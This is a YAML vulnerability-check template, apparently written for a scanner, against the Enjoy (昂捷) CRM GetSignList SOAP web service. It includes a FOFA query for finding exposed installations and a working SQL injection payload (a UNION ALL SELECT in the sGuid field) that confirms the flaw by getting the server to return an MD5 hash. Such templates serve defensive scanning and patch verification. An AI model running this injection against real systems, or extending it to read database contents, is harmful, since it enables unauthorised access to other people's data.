id: poc-yaml-enjoyrmis-getsignlist-sqli
info:
  name: 昂捷CRM GetSignList SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: enjoyrmis
  fofa: body="CheckSilverlightInstalled"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: POST
  path: /enjoyRMIS_WS/WS/OA/CWSOffice.asmx
  headers:
    Content-Type: text/xml; charset=utf-8
    SOAPAction: '"http://tempuri.org/GetSignList"'
  data: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
    \ xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\
    >\n  <soap:Body>\n    <GetSignList xmlns=\"http://tempuri.org/\">\n      <sGuid>1'\
    \ UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}')),NULL,NULL,NULL--</sGuid>\n\
    \      <sType>string</sType>\n      <sSourceId>string</sSourceId>\n    </GetSignList>\n\
    \  </soap:Body>\n</soap:Envelope>"
  expression: "status_code == 200 && \ncontains(body,\"0x\" + t2) &&\ncontains(body,\"\
    GetSignListResponse\") &&\ncontains(body,\"GetSignListResult\") &&\ncontains(content_type,\"\
    text/xml\")\n"
transport: http
